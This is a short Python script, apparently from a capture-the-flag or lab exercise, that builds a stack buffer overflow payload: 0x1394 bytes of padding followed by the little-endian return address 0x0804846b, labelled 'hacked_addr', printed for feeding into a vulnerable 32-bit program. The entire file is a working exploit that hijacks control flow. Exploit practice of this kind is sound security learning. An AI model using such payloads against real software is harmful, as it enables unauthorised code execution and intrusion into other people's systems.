#!/usr/bin/env python3
import sys

offset      = 0x1394

# hacked_addr = 0x0804846b
payload = b'A' * offset + b'\x6b\x84\x04\x08' # 小端序

sys.stdout.buffer.write(payload + b'\n')

